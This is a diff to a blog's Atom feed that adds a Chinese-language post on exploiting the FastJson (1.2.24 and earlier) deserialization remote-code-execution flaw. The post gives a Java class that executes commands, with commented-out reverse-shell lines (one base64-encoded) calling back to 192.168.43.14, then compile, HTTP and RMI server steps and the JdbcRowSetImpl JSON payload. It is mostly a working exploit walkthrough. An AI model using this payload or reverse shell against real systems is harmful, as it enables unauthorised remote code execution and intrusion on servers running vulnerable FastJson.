@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://x-f1v3.github.io/"/>
-  <updated>2019-06-13T05:44:48.615Z</updated>
+  <updated>2019-06-28T07:40:54.507Z</updated>
   <id>http://x-f1v3.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FastJson反序列化RCE</title>
+    <link href="http://x-f1v3.github.io//blog/1561704300515.html"/>
+    <id>http://x-f1v3.github.io//blog/1561704300515.html</id>
+    <published>2019-06-28T06:45:00.000Z</published>
+    <updated>2019-06-28T07:40:54.507Z</updated>
+    
+    <content type="html"><![CDATA[<p>在一次代码审计中，发现了FastJson反序列化RCE漏洞，利用了一波。<br><a id="more"></a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.2.24以及之前版本（2017.1）</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>方法很多，这里直接用<code>https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE</code>的方法。</p><h4 id="修改-CommandObject-java"><a href="#修改-CommandObject-java" class="headerlink" title="修改 CommandObject.java"></a>修改 CommandObject.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span>java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandObject</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">Runtimert=Runtime.getRuntime();</span><br><span class="line"><span class="comment">//Runtime.getRuntime().exec("/bin/bash -i &gt;&amp;/dev/tcp/192.168.43.14/2018&lt;&amp;1");</span></span><br><span class="line"><span class="comment">//String[] commands = &#123;"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"&#125;;</span></span><br><span class="line"></span><br><span class="line">String[] commands = &#123;<span class="string">"touch"</span>,<span class="string">"/opt/test"</span>&#125;; <span class="comment">//Command</span></span><br><span class="line">Processpc = rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        CommandObject e = <span class="keyword">new</span> CommandObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="编译-CommandObject-java"><a href="#编译-CommandObject-java" class="headerlink" title="编译 CommandObject.java"></a>编译 CommandObject.java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac CommandObject.java</span><br></pre></td></tr></table></figure><h4 id="开启HTTP服务"><a href="#开启HTTP服务" class="headerlink" title="开启HTTP服务"></a>开启HTTP服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><h4 id="开启RMIServer"><a href="#开启RMIServer" class="headerlink" title="开启RMIServer"></a>开启RMIServer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar  ip port</span><br></pre></td></tr></table></figure><h4 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:port/Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h3 id="其他参考链接"><a href="#其他参考链接" class="headerlink" title="其他参考链接"></a>其他参考链接</h3><ul><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li><li><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/fastjson/vuln" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson/vuln</a></li><li><a href="https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html" target="_blank" rel="noopener">https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html</a></li><li><a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9800288.html</a></li><li><a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/" target="_blank" rel="noopener">https://www.restran.net/2018/10/29/fastjson-rce-notes/</a></li><li><a href="http://blog.nsfocus.net/fastjson-rce-poc/" target="_blank" rel="noopener">http://blog.nsfocus.net/fastjson-rce-poc/</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在一次代码审计中，发现了FastJson反序列化RCE漏洞，利用了一波。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="漏洞分析" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
+    
+      <category term="漏洞" scheme="http://x-f1v3.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="反序列化" scheme="http://x-f1v3.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
   
   <entry>
     <title>SpringBoot无需配置文件上传</title>
